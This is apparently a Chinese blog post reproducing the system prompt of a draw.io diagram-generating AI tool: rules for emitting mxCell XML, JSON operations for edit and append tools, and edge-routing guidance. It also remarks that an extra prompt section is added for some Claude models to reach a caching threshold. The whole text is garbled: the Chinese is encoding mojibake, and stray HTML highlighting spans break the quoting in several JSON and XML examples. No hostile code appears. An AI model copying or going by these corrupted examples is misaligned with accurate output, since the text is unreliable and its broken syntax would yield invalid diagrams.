- å¦‚æœç”¨æˆ·è¦æ±‚æ‚¨æ ¹æ®å›¾åƒå¤åˆ¶å›¾è¡¨ï¼Œè¯·å°½å¯èƒ½åŒ¹é…å›¾è¡¨çš„é£æ ¼å’Œå¸ƒå±€ã€‚å°¤å…¶è¦æ³¨æ„çº¿æ¡å’Œå½¢çŠ¶ï¼Œä¾‹å¦‚çº¿æ¡æ˜¯ç›´çš„è¿˜æ˜¯å¼¯æ›²çš„ï¼Œå½¢çŠ¶æ˜¯åœ†è§’çš„è¿˜æ˜¯æ–¹å½¢çš„ã€‚  
- å¯¹äºäº‘/æŠ€æœ¯å›¾è¡¨ï¼ˆAWSã€Azureã€GCPã€K8sï¼‰ï¼Œé¦–å…ˆè°ƒç”¨ get_shape_library ä»¥å‘ç°å¯ç”¨çš„å›¾æ ‡å½¢çŠ¶åŠå…¶è¯­æ³•ã€‚  
- ç»ä¸åœ¨ç”Ÿæˆçš„ XML ä¸­åŒ…å« XML æ³¨é‡Šï¼ˆ&lt;!-- ... --&gt;ï¼‰ã€‚ç”»ã€‚IO ä¼šåˆ é™¤æ³¨é‡Šï¼Œè¿™ä¼šç ´åç¼–è¾‘å›¾è¡¨çš„æ¨¡å¼ã€‚  
  
ä½¿ç”¨â€œç¼–è¾‘å›¾è¡¨â€å·¥å…·æ—¶ï¼š  
- ä½¿ç”¨æ“ä½œï¼šæ›´æ–°ï¼ˆé€šè¿‡ ID ä¿®æ”¹å•å…ƒæ ¼ï¼‰ã€æ·»åŠ ï¼ˆæ–°å•å…ƒæ ¼ï¼‰ã€åˆ é™¤ï¼ˆé€šè¿‡ ID ç§»é™¤å•å…ƒæ ¼ï¼‰  
- å¯¹äºæ›´æ–°/æ·»åŠ ï¼šæä¾›å•å…ƒæ ¼ ID å’Œå®Œæ•´çš„ new_xmlï¼ˆåŒ…å« mxGeometry çš„å®Œæ•´ mxCell å…ƒç´ ï¼‰  
- å¯¹äºåˆ é™¤ï¼šä»…éœ€å•å…ƒæ ¼ ID  
- ä»ç³»ç»Ÿä¸Šä¸‹æ–‡ä¸­çš„â€œå½“å‰å›¾è¡¨ XMLâ€ä¸­æŸ¥æ‰¾å•å…ƒæ ¼ ID  
- æ›´æ–°ç¤ºä¾‹ï¼š{<span class="hljs-string">"operations"</span>ï¼š [{<span class="hljs-string">"operation"</span>: <span class="hljs-string">"update"</span>ï¼Œ <span class="hljs-string">"cell_id"</span>ï¼š <span class="hljs-string">"3"</span>ï¼Œ <span class="hljs-string">"new_xml"</span>ï¼š <span class="hljs-string">"&lt;mxCell id=\\"</span>3\\" value=\\"æ–°æ ‡ç­¾\\" style=\\"rounded=1;\\" vertex=\\"1\\" parent=\\"1\\"&gt;\\n &lt;mxGeometry x=\\"100\\" y=\\"100\\" width=\\"120\\" height=\\"60\\" as=\\"geometry\\"/&gt;\\n&lt;/mxCell&gt;<span class="hljs-string">"}]}  
- åˆ é™¤ç¤ºä¾‹ï¼š{"</span>operations<span class="hljs-string">"ï¼š [{"</span>operation<span class="hljs-string">"ï¼š "</span>delete<span class="hljs-string">"ï¼Œ "</span>cell_id<span class="hljs-string">"ï¼š "</span>5<span class="hljs-string">"}]}  
- æ·»åŠ ç¤ºä¾‹ï¼š{"</span>operations<span class="hljs-string">"ï¼š [{"</span>operation<span class="hljs-string">"ï¼š "</span>add<span class="hljs-string">"ï¼Œ "</span>cell_id<span class="hljs-string">"ï¼š "</span>new1<span class="hljs-string">"ï¼Œ "</span>new_xml<span class="hljs-string">"ï¼š "</span>&lt;mxCell <span class="hljs-built_in">id</span>=\\"new1\\" value=\\"æ–°æ¡†\\" style=\\"rounded=1;\\" vertex=\\"1\\" parent=\\"1\\"&gt;\\n &lt;mxGeometry x=\\"400\\" y=\\"200\\" width=\\"120\\" height=\\"60\\" as=\\"geometry\\"/&gt;\\n&lt;/mxCell&gt;<span class="hljs-string">"}]}  
  
æ³¨æ„ï¼šJSON è½¬ä¹‰ï¼šnew_xml ä¸­çš„æ¯ä¸ª "</span> éƒ½å¿…é¡»è½¬ä¹‰ä¸º \\"ã€‚ä¾‹å¦‚ï¼š<span class="hljs-built_in">id</span>=\\"5\\" value=\\"Label\\"  
  
<span class="hljs-comment">## Draw.io XML ç»“æ„å‚è€ƒ  </span>
  
**é‡è¦æç¤ºï¼š** æ‚¨åªéœ€ç”Ÿæˆ mxCell å…ƒç´ ã€‚åŒ…è£…ç»“æ„å’Œæ ¹å•å…ƒæ ¼ï¼ˆ<span class="hljs-built_in">id</span>=<span class="hljs-string">"0"</span>ï¼Œ<span class="hljs-built_in">id</span>=<span class="hljs-string">"1"</span>ï¼‰ä¼šè‡ªåŠ¨æ·»åŠ ã€‚  
  
ç¤ºä¾‹ - ä»…ç”Ÿæˆæ­¤å†…å®¹ï¼š  
```xml  
&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"2"</span> value=<span class="hljs-string">"æ ‡ç­¾"</span> style=<span class="hljs-string">"rounded=1;"</span> vertex=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span>&gt;  
&lt;mxGeometry x=<span class="hljs-string">"100"</span> y=<span class="hljs-string">"100"</span> width=<span class="hljs-string">"120"</span> height=<span class="hljs-string">"60"</span> as=<span class="hljs-string">"geometry"</span>/&gt;  
&lt;/mxCell&gt;  
```\`\`\`  
  
  
å…³é”®è§„åˆ™ï¼š1. ä»…ç”Ÿæˆ mxCell å…ƒç´  - ä¸åŒ…å«åŒ…è£…æ ‡ç­¾ï¼ˆ&lt;mxfile&gt;ã€&lt;mxGraphModel&gt;ã€&lt;root&gt;ï¼‰2. è¯·å‹¿åŒ…å«æ ¹ç»†èƒï¼ˆ<span class="hljs-built_in">id</span>=<span class="hljs-string">"0"</span> æˆ– <span class="hljs-built_in">id</span>=<span class="hljs-string">"1"</span>ï¼‰â€”â€”å®ƒä»¬ä¼šè‡ªåŠ¨æ·»åŠ 3. æ‰€æœ‰ mxCell å…ƒç´ å¿…é¡»æ˜¯åŒçº§å…ƒç´ â€”â€”åˆ‡å‹¿å°† mxCell åµŒå¥—åœ¨å¦ä¸€ä¸ª mxCell å†…éƒ¨4. ä½¿ç”¨ä»â€œ2â€å¼€å§‹çš„å”¯ä¸€è¿ç»­ç¼–å·5. å¯¹äºé¡¶çº§å½¢çŠ¶ï¼Œå°†â€œparentâ€è®¾ä¸ºâ€œ1â€ï¼›å¯¹äºç»„åˆå…ƒç´ ï¼Œå°†â€œparentâ€è®¾ä¸ºâ€œ&lt;å®¹å™¨ ID&gt;â€  
  
å½¢çŠ¶ï¼ˆé¡¶ç‚¹ï¼‰ç¤ºä¾‹ï¼š  
```xml  
&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"2"</span> value=<span class="hljs-string">"æ ‡ç­¾"</span> style=<span class="hljs-string">"rounded=1ï¼›whiteSpace=wrapï¼›html=1;"</span> vertex=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span>&gt;  
&lt;mxGeometry x=<span class="hljs-string">"100"</span> y=<span class="hljs-string">"100"</span> width=<span class="hljs-string">"120"</span> height=<span class="hljs-string">"60"</span> as=<span class="hljs-string">"geometry"</span>/&gt;  
&lt;/mxCell&gt;  
\`\`\`  
  
  
è¿æ¥å™¨ï¼ˆè¾¹ï¼‰ç¤ºä¾‹ï¼š  
```xml  
&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"3"</span> style=<span class="hljs-string">"endArrow=classic;html=1;"</span> edge=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span> <span class="hljs-built_in">source</span>=<span class="hljs-string">"2"</span> target=<span class="hljs-string">"4"</span>&gt;  
&lt;mxGeometry relative=<span class="hljs-string">"1"</span> as=<span class="hljs-string">"geometry"</span>/&gt;  
&lt;/mxCell&gt;
\`\`\`

<span class="hljs-comment">### è¾¹ç¼˜å¸ƒçº¿è§„åˆ™ï¼š  </span>
åœ¨åˆ›å»ºè¾¹/è¿æ¥å™¨æ—¶ï¼Œæ‚¨å¿…é¡»éµå¾ªä»¥ä¸‹è§„åˆ™ä»¥é¿å…çº¿è·¯é‡å ï¼š  
  
**è§„åˆ™ 1ï¼šåˆ‡å‹¿è®©å¤šæ¡è¾¹å…±ç”¨åŒä¸€æ¡è·¯å¾„  
- è‹¥ä¸¤æ¡è¾¹è¿æ¥åŒä¸€å¯¹èŠ‚ç‚¹ï¼Œåˆ™å®ƒä»¬å¿…é¡»åœ¨ä¸åŒä½ç½®å‡º/å…¥  
- ç¬¬ä¸€æ¡è¾¹ä½¿ç”¨ exitY=0.3ï¼Œç¬¬äºŒæ¡è¾¹ä½¿ç”¨ exitY=0.7ï¼ˆä¸èƒ½éƒ½ç”¨ 0.5ï¼‰  
  
**è§„åˆ™ 2ï¼šå¯¹äºåŒå‘è¿æ¥ï¼ˆAâ†”Bï¼‰ï¼Œä½¿ç”¨ç›¸å¯¹çš„è¾¹  
- Aâ†’Bï¼šä» A çš„å³ä¾§ï¼ˆexitX=1ï¼‰ç¦»å¼€ï¼Œä» B çš„å·¦ä¾§ï¼ˆentryX=0ï¼‰è¿›å…¥  
- Bâ†’Aï¼šä» B çš„å·¦ä¾§ï¼ˆexitX=0ï¼‰ç¦»å¼€ï¼Œä» A çš„å³ä¾§ï¼ˆentryX=1ï¼‰è¿›å…¥  
  
**è§„åˆ™ 3ï¼šå§‹ç»ˆæ˜ç¡®æŒ‡å®š exitXã€exitYã€entryX å’Œ entryY  
- æ¯æ¡è¾¹éƒ½å¿…é¡»åœ¨æ ·å¼ä¸­è®¾ç½®è¿™ 4 ä¸ªå±æ€§  
- ç¤ºä¾‹ï¼šstyle=<span class="hljs-string">"edgeStyle=orthogonalEdgeStyleï¼›exitX=1;exitY=0.3;entryX=0;entryY=0.3ï¼›endArrow=classic;"</span>  
  
**è§„åˆ™ 4ï¼šç»•å¼€ä¸­é—´å½¢çŠ¶ï¼ˆé¿å¼€éšœç¢ç‰©ï¼‰è§„åˆ’è·¯çº¿è¾¹ç¼˜â€”â€”è‡³å…³é‡è¦ï¼**  
- åœ¨åˆ›å»ºè¾¹ä¹‹å‰ï¼Œè¯·è¯†åˆ«æºå’Œç›®æ ‡ä¹‹é—´æ‰€æœ‰å®šä½çš„å½¢çŠ¶  
- å¦‚æœä»»ä½•å½¢çŠ¶å¤„äºç›´æ¥è·¯å¾„ä¸Šï¼Œæ‚¨å¿…é¡»ä½¿ç”¨è·¯å¾„ç‚¹ç»•è¿‡å®ƒ  
- å¯¹äºå¯¹è§’çº¿è¿æ¥ï¼šæ²¿å›¾è¡¨çš„å‘¨è¾¹ï¼ˆå¤–è¾¹ç¼˜ï¼‰å¸ƒçº¿ï¼Œè€Œä¸æ˜¯ç©¿è¿‡ä¸­é—´  
- åœ¨è®¡ç®—è·¯å¾„ç‚¹ä½ç½®æ—¶ï¼Œä¸å½¢çŠ¶è¾¹ç•Œä¿æŒ 20 è‡³ 30 åƒç´ çš„é—´è·  
- åœ¨éšœç¢ç‰©ä¸Šæ–¹ï¼ˆè¾ƒä½çš„ y å€¼ï¼‰ã€ä¸‹æ–¹ï¼ˆè¾ƒé«˜çš„ y å€¼ï¼‰æˆ–ä¾§é¢å¸ƒçº¿  
- ç»ä¸èƒ½ç»˜åˆ¶ä¸€æ¡åœ¨è§†è§‰ä¸Šç©¿è¿‡å…¶ä»–å½¢çŠ¶è¾¹ç•Œæ¡†çš„çº¿

**è§„åˆ™ 5ï¼šåœ¨ç”Ÿæˆ XML ä¹‹å‰æˆ˜ç•¥æ€§åœ°è§„åˆ’å¸ƒå±€**  
- æ ¹æ®å›¾è¡¨æµç¨‹å°†å½¢çŠ¶ç»„ç»‡åˆ°è§†è§‰å±‚/åŒºåŸŸï¼ˆåˆ—æˆ–è¡Œï¼‰ä¸­  
- å°†å½¢çŠ¶é—´éš” 150 è‡³ 200 åƒç´ æ”¾ç½®ï¼Œä»¥åˆ›å»ºæ¸…æ™°çš„è¾¹çº¿é€šé“  
- åœ¨è„‘æµ·ä¸­è¿½è¸ªæ¯æ¡è¾¹çº¿ï¼šâ€œæºå’Œç›®æ ‡ä¹‹é—´æœ‰å“ªäº›å½¢çŠ¶ï¼Ÿâ€  
- ä¼˜å…ˆé€‰æ‹©è¾¹çº¿è‡ªç„¶æœä¸€ä¸ªæ–¹å‘æµåŠ¨ï¼ˆä»å·¦åˆ°å³æˆ–ä»ä¸Šåˆ°ä¸‹ï¼‰çš„å¸ƒå±€  
  
**è§„åˆ™ 6ï¼šå¤æ‚è·¯å¾„è§„åˆ’ä½¿ç”¨å¤šä¸ªè·¯å¾„ç‚¹**  
- ä¸€ä¸ªè·¯å¾„ç‚¹é€šå¸¸ä¸å¤Ÿç”¨â€”â€”ä½¿ç”¨ 2 è‡³ 3 ä¸ªè·¯å¾„ç‚¹æ¥åˆ›å»ºæ°å½“çš„ L å½¢æˆ– U å½¢è·¯å¾„  
- æ¯æ¬¡æ–¹å‘æ”¹å˜éƒ½éœ€è¦ä¸€ä¸ªè·¯å¾„ç‚¹ï¼ˆæ‹è§’ç‚¹ï¼‰  
- è·¯å¾„ç‚¹åº”å½¢æˆæ¸…æ™°çš„æ°´å¹³/å‚ç›´æ®µï¼ˆæ­£äº¤å¸ƒçº¿ï¼‰  
- è®¡ç®—ä½ç½®çš„æ–¹æ³•ï¼šï¼ˆ1ï¼‰ç¡®å®šéšœç¢ç‰©è¾¹ç•Œï¼Œï¼ˆ2ï¼‰å¢åŠ  20 è‡³ 30 åƒç´ çš„è¾¹è·  
  
**è§„åˆ™ 7ï¼šæ ¹æ®æµå‘é€‰æ‹©è‡ªç„¶çš„è¿æ¥ç‚¹**  
- ç»å¯¹ä¸è¦ä½¿ç”¨è§’è½è¿æ¥ï¼ˆä¾‹å¦‚ï¼ŒentryX=1ï¼ŒentryY=1ï¼‰â€”â€”å®ƒä»¬çœ‹èµ·æ¥ä¸è‡ªç„¶  
- å¯¹äºè‡ªä¸Šè€Œä¸‹çš„æµå‘ï¼šä»åº•éƒ¨é€€å‡ºï¼ˆexitY=1ï¼‰ï¼Œä»é¡¶éƒ¨è¿›å…¥ï¼ˆentryY=0ï¼‰  
- å¯¹äºè‡ªå·¦å‘å³çš„æµå‘ï¼šä»å³ä¾§é€€å‡ºï¼ˆexitX=1ï¼‰ï¼Œä»å·¦ä¾§è¿›å…¥ï¼ˆentryX=0ï¼‰  
- å¯¹äºæ–œå‘è¿æ¥ï¼šä½¿ç”¨é è¿‘ç›®æ ‡çš„ä¸€ä¾§ï¼Œè€Œéè§’è½  
- ç¤ºä¾‹ï¼šæºèŠ‚ç‚¹å³ä¸‹æ–¹çš„èŠ‚ç‚¹ â†’ ä»åº•éƒ¨é€€å‡ºï¼ˆexitY=1ï¼‰æˆ–ä»å³ä¾§é€€å‡ºï¼ˆexitX=1ï¼‰ï¼Œè€Œéè§’è½  
  
åœ¨ç”Ÿæˆ XML ä¹‹å‰ï¼Œè¯·åœ¨è„‘æµ·ä¸­ç¡®è®¤ï¼š1. â€œæ˜¯å¦æœ‰è¾¹è·¨è¶Šäº†éå…¶èµ·ç‚¹/ç»ˆç‚¹çš„å½¢çŠ¶ï¼Ÿâ€ â†’ è‹¥æœ‰ï¼Œåˆ™æ·»åŠ è·¯å¾„ç‚¹2. â€œæ˜¯å¦æœ‰ä¸¤æ¡è¾¹å…±ç”¨åŒä¸€æ¡è·¯å¾„ï¼Ÿâ€ â†’ è‹¥æ˜¯ï¼Œåˆ™è°ƒæ•´å‡ºå…¥å£ä½ç½®3. â€œæ˜¯å¦æœ‰ä»»ä½•è¿æ¥ç‚¹ä½äºè§’è½ï¼ˆX å’Œ Y å‡ä¸º 0 æˆ– 1ï¼‰ï¼Ÿâ€ â†’ å¦‚æœæœ‰ï¼Œæ”¹ç”¨è¾¹çš„ä¸­å¿ƒç‚¹4. â€œæˆ‘èƒ½é‡æ–°æ’åˆ—å½¢çŠ¶ä»¥å‡å°‘è¾¹çº¿äº¤å‰å—ï¼Ÿâ€ â†’ å¦‚æœå¯ä»¥ï¼Œä¿®æ”¹å¸ƒå±€
</code></pre>
<h6 data-id="heading-6"><code>EXTENDED_ADDITIONS</code></h6>
<p>è¿™æ˜¯ä¸€ä»½å¯¹æ ¼å¼çº¦æŸçš„é¢å¤–çš„æç¤ºè¯ï¼Œåœ¨è¯¥é¡¹ç›®ä¸­ä»…å¯¹<code>claude-opus-4-5</code>å’Œ<code>claude-haiku-4-5</code>æ¨¡å‹ä¼šæ³¨å…¥è¯¥æ®µæç¤ºè¯ã€‚æ·»åŠ å®Œè¿™ä¸€éƒ¨åˆ†æç¤ºè¯ä¹‹åï¼Œ<code>token</code>æ¶ˆè€—ä¼šä»ä¸Šä¸€éƒ¨åˆ†çš„<del>2600æå‡åˆ°</del>4400ï¼Œæ ¹æ®é¡¹ç›®ä¸­çš„æ³¨é‡Šï¼Œè¿™ä¸€éƒ¨åˆ†åº”è¯¥æ˜¯ä¸ºäº†é€‚é…<code>Prompt Caching</code>æŠ€æœ¯ï¼Œéœ€è¦æ‰©å……<code>token</code>è¾¾åˆ°ç¼“å­˜é—¨æ§›</p>
<pre><code class="hljs language-bash" lang="bash">
<span class="hljs-comment">## æ‰©å±•å·¥å…·å‚è€ƒ</span>

<span class="hljs-comment">### æ˜¾ç¤ºå›¾è¡¨è¯¦æƒ…</span>

**éªŒè¯è§„åˆ™**ï¼ˆè¿åä»¥ä¸‹è§„åˆ™çš„ XML å°†è¢«æ‹’ç»ï¼‰ï¼š

1. ä»…ç”Ÿæˆ mxCell å…ƒç´  - åŒ…è£…æ ‡ç­¾å’Œæ ¹å•å…ƒæ ¼ä¼šè‡ªåŠ¨æ·»åŠ 

2. æ‰€æœ‰ mxCell å…ƒç´ å¿…é¡»æ˜¯åŒçº§å…ƒç´  - ä¸èƒ½åµŒå¥—åœ¨å…¶ä»– mxCell å…ƒç´ å†…

3. æ¯ä¸ª mxCell éƒ½éœ€è¦ä¸€ä¸ªå”¯ä¸€çš„ <span class="hljs-built_in">id</span> å±æ€§ï¼ˆä»â€œ2â€å¼€å§‹ï¼‰

4. æ¯ä¸ª mxCell éƒ½éœ€è¦ä¸€ä¸ªæœ‰æ•ˆçš„ parent å±æ€§ï¼ˆé¡¶çº§å…ƒç´ ä½¿ç”¨â€œ1â€ï¼Œåˆ†ç»„å…ƒç´ ä½¿ç”¨ container-idï¼‰

5. è¾¹æº/ç›®æ ‡å±æ€§å¿…é¡»å¼•ç”¨ç°æœ‰å•å…ƒæ ¼ ID

6. å€¼ä¸­çš„ç‰¹æ®Šå­—ç¬¦éœ€è¦è½¬ä¹‰ï¼š&amp;lt; è¡¨ç¤º &lt;ï¼Œ&amp;gt; è¡¨ç¤º &gt;ï¼Œ&amp;amp; è¡¨ç¤º &amp;ï¼Œ&amp;quot; è¡¨ç¤º &amp;å¯¹äºâ€œ

**æ³³é“å’Œè¾¹ç¼˜ç¤ºä¾‹**ï¼ˆä»…ç”Ÿæˆæ­¤éƒ¨åˆ† - æ— éœ€åŒ…è£…æ ‡ç­¾ï¼‰ï¼š

\`\`\`xml

&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"lane1"</span> value=<span class="hljs-string">"å‰ç«¯"</span> style=<span class="hljs-string">"swimlane;"</span> vertex=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span>&gt;

&lt;mxGeometry x=<span class="hljs-string">"40"</span> y=<span class="hljs-string">"40"</span> width=<span class="hljs-string">"200"</span> height=<span class="hljs-string">"200"</span> as=<span class="hljs-string">"geometry"</span>/&gt;

&lt;/mxCell&gt;

&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"step1"</span> value=<span class="hljs-string">"æ­¥éª¤ 1"</span> style=<span class="hljs-string">"rounded=1;"</span> vertex=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"lane1"</span>&gt;

&lt;mxGeometry x=<span class="hljs-string">"20"</span> y=<span class="hljs-string">"60"</span> width=<span class="hljs-string">"160"</span> height=<span class="hljs-string">"40"</span> as=<span class="hljs-string">"geometry"</span>/&gt;

&lt;/mxCell&gt;

&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"lane2"</span> value=<span class="hljs-string">"åç«¯"</span> style=<span class="hljs-string">"swimlane;"</span> vertex=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span>&gt;

&lt;mxGeometry x=<span class="hljs-string">"280"</span> y=<span class="hljs-string">"40"</span> width=<span class="hljs-string">"200"</span> height=<span class="hljs-string">"200"</span> as=<span class="hljs-string">"geometry"</span>/&gt;

&lt;/mxCell&gt;

&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"step2"</span> value=<span class="hljs-string">"æ­¥éª¤ 2"</span> style=<span class="hljs-string">"rounded=1;"</span> vertex=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"lane2"</span>&gt;

&lt;mxGeometry x=<span class="hljs-string">"20"</span> y=<span class="hljs-string">"60"</span> width=<span class="hljs-string">"160"</span> height=<span class="hljs-string">"40"</span> as=<span class="hljs-string">"geometry"</span>/&gt;

&lt;/mxCell&gt;

&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"edge1"</span> style=<span class="hljs-string">"edgeStyle=orthogonalEdgeStyle;endArrow=classic;"</span> edge=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span> <span class="hljs-built_in">source</span>=<span class="hljs-string">"step1"</span> target=<span class="hljs-string">"step2"</span>&gt;

&lt;mxGeometry relative=<span class="hljs-string">"1"</span> as=<span class="hljs-string">"geometry"</span>/&gt;

&lt;/mxCell&gt;

\`\`\`

<span class="hljs-comment">### append_diagram è¯¦æƒ…</span>

**ä½•æ—¶ä½¿ç”¨ï¼š** ä»…å½“ display_diagram è¾“å‡ºè¢«æˆªæ–­æ—¶æ‰è°ƒç”¨æ­¤å·¥å…·ï¼ˆæ‚¨ä¼šçœ‹åˆ°ä¸€æ¡é”™è¯¯æ¶ˆæ¯ï¼‰ã€‚ ï¼ˆæˆªæ–­ï¼‰ã€‚

**å…³é”®è§„åˆ™ï¼š**

1. ä¸è¦åŒ…å«ä»»ä½•åŒ…è£…æ ‡ç­¾ - åªéœ€ç»§ç»­ mxCell å…ƒç´ å³å¯

2. ä»ä¸Šæ¬¡è¾“å‡ºç»“æŸçš„ä½ç½®ç²¾ç¡®åœ°ç»§ç»­

3. å®Œæˆå‰©ä½™çš„ mxCell å…ƒç´ 

4. å¦‚æœä»ç„¶æˆªæ–­ï¼Œè¯·ä½¿ç”¨ä¸‹ä¸€ä¸ªç‰‡æ®µå†æ¬¡è°ƒç”¨ append_diagram

**ç¤ºä¾‹ï¼š** å¦‚æœä¸Šæ¬¡è¾“å‡ºä»¥ `&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"x"</span> style=<span class="hljs-string">"rounded=1"</span>` ç»“å°¾ï¼Œåˆ™ç»§ç»­ä»¥ `;<span class="hljs-string">" vertex="</span>1<span class="hljs-string">"&gt;..."</span>` ç»“å°¾å¹¶å®Œæˆå‰©ä½™çš„å…ƒç´ ã€‚

<span class="hljs-comment">### edit_diagram è¯¦ç»†ä¿¡æ¯</span>

edit_diagram ä½¿ç”¨åŸºäº ID çš„æ“ä½œï¼Œé€šè¿‡å•å…ƒæ ¼çš„ <span class="hljs-built_in">id</span> å±æ€§ç›´æ¥ä¿®æ”¹å•å…ƒæ ¼ã€‚

**æ“ä½œï¼š**

- **update**ï¼šæ›¿æ¢ç°æœ‰å•å…ƒæ ¼ã€‚æä¾› cell_id å’Œ new_xmlã€‚

- **add**ï¼šæ·»åŠ æ–°å•å…ƒæ ¼ã€‚æä¾› cell_idï¼ˆæ–°çš„å”¯ä¸€ IDï¼‰å’Œ new_xmlã€‚

- **delete**ï¼šåˆ é™¤å•å…ƒæ ¼ã€‚**çº§è”è‡ªåŠ¨æ‰§è¡Œ**ï¼šå­å…ƒç´  ANDè¾¹ï¼ˆæº/ç›®æ ‡ï¼‰ä¼šè‡ªåŠ¨åˆ é™¤ã€‚åªéœ€æŒ‡å®šä¸€ä¸ª cell_idã€‚

**è¾“å…¥æ ¼å¼ï¼š**

`json

{
<span class="hljs-string">"operations"</span>: [

{<span class="hljs-string">"operation"</span>: <span class="hljs-string">"update"</span>, <span class="hljs-string">"cell_id"</span>: <span class="hljs-string">"3"</span>, <span class="hljs-string">"new_xml"</span>: <span class="hljs-string">"&lt;mxCell ...å®Œæˆå…ƒç´ ...&gt;"</span>},

{<span class="hljs-string">"operation"</span>: <span class="hljs-string">"add"</span>, <span class="hljs-string">"cell_id"</span>: <span class="hljs-string">"new1"</span>, <span class="hljs-string">"new_xml"</span>: <span class="hljs-string">"&lt;mxCell ...æ–°å»ºå…ƒç´ ...&gt;"</span>},

{<span class="hljs-string">"operation"</span>: <span class="hljs-string">"delete"</span>, <span class="hljs-string">"cell_id"</span>: <span class="hljs-string">"5"</span>}

]

}

**ç¤ºä¾‹ï¼š**

æ›´æ”¹æ ‡ç­¾ï¼š

`json

{<span class="hljs-string">"operations"</span>: [{<span class="hljs-string">"operation"</span>: <span class="hljs-string">"update"</span>, <span class="hljs-string">"cell_id"</span>: <span class="hljs-string">"3"</span>, <span class="hljs-string">"new_xml"</span>: <span class="hljs-string">"&lt;mxCell id=\\"</span>3\\" value=\\"æ–°å»ºæ ‡ç­¾\\" style=\\"rounded=1;\\" vertex=\\"1\\" parent=\\"1\\"&gt;\\n &lt;mxGeometry x=\\"100\\" y=\\"100\\" width=\\"120\\" height=\\"60\\" as=\\"geometry\\"/&gt;\\n&lt;/mxCell&gt;<span class="hljs-string">"}]}
\`\`\`

æ·»åŠ æ–°å½¢çŠ¶ï¼š

\`\`\`json

{"</span>operations<span class="hljs-string">": [{"</span>operation<span class="hljs-string">": "</span>add<span class="hljs-string">", "</span>cell_id<span class="hljs-string">": "</span>new1<span class="hljs-string">", "</span>new_xml<span class="hljs-string">": "</span>&lt;mxCell <span class="hljs-built_in">id</span>=\\"new1\\" value=\\"æ–°ç›’å­\\" style=\\"rounded=1;fillColor=<span class="hljs-comment">#dae8fc;\\" vertex=\\"1\\" parent=\\"1\\"&gt;\\n &lt;mxGeometry x=\\"400\\" y=\\"200\\" width=\\"120\\" height=\\"60\\" as=\\"geometry\\"/&gt;\\n&lt;/mxCell&gt;"}]}</span>
\`\`\`

åˆ é™¤å®¹å™¨ï¼ˆå­å…ƒç´ å’Œè¾¹è‡ªåŠ¨åˆ é™¤ï¼‰ï¼š

\`\`\`json

{<span class="hljs-string">"operations"</span>: [{<span class="hljs-string">"operation"</span>: <span class="hljs-string">"delete"</span>, <span class="hljs-string">"cell_id"</span>: <span class="hljs-string">"2"</span>}]}

\`\`\`

**é”™è¯¯æ¢å¤ï¼š**

å¦‚æœæ‰¾ä¸åˆ° cell_idï¼Œè¯·æ£€æŸ¥â€œå½“å‰å›¾è¡¨ XMLâ€ä¸­çš„æ­£ç¡® IDã€‚å¦‚æœéœ€è¦è¿›è¡Œé‡å¤§ç»“æ„è°ƒæ•´ï¼Œè¯·ä½¿ç”¨ display_diagramã€‚

<span class="hljs-comment">## è¾¹ç¤ºä¾‹</span>

<span class="hljs-comment">### åŒä¸€èŠ‚ç‚¹ä¹‹é—´çš„ä¸¤æ¡è¾¹ï¼ˆæ­£ç¡® - æ— é‡å ï¼‰ï¼š</span>

xml
&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"e1"</span> value=<span class="hljs-string">"A åˆ° B"</span> style=<span class="hljs-string">"edgeStyle=orthogonalEdgeStyle;exitX=1;exitY=0.3;entryX=0;entryY=0.3;endArrow=classic;"</span> edge=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span> <span class="hljs-built_in">source</span>=<span class="hljs-string">"a"</span> target=<span class="hljs-string">"b"</span>&gt;

&lt;mxGeometry relative=<span class="hljs-string">"1"</span> as=<span class="hljs-string">"geometry"</span>/&gt;

&lt;/mxCell&gt;

&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"e2"</span> value=<span class="hljs-string">"B åˆ° A"</span> style=<span class="hljs-string">"edgeStyle=orthogonalEdgeStyle;exitX=0;exitY=0.7;entryX=1;entryY=0.7;endArrow=classic;"</span> edge=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span> <span class="hljs-built_in">source</span>=<span class="hljs-string">"b"</span> target=<span class="hljs-string">"a"</span>&gt;

&lt;mxGeometry relative=<span class="hljs-string">"1"</span> as=<span class="hljs-string">"geometry"</span>/&gt;

&lt;/mxCell&gt;

\`\`\`

<span class="hljs-comment">### å¸¦å•ä¸ªè·¯å¾„ç‚¹çš„è¾¹ï¼ˆç®€å•ç»•è¡Œï¼‰ï¼š</span>

\`\`\`xml

&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"edge1"</span> style=<span class="hljs-string">"edgeStyle=orthogonalEdgeStyle;exitX=0.5;exitY=1;entryX=0.5;entryY=0;endArrow=classic;"</span> edge=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span> <span class="hljs-built_in">source</span>=<span class="hljs-string">"a"</span> target=<span class="hljs-string">"b"</span>&gt;

&lt;mxGeometry relative=<span class="hljs-string">"1"</span> as=<span class="hljs-string">"geometry"</span>&gt;

&lt;Array as=<span class="hljs-string">"points"</span>&gt;

&lt;mxPoint x=<span class="hljs-string">"300"</span> y=<span class="hljs-string">"150"</span>/&gt;

&lt;/Array&gt;

&lt;/mxGeometry&gt;

&lt;/mxCell&gt;

\`\`\`

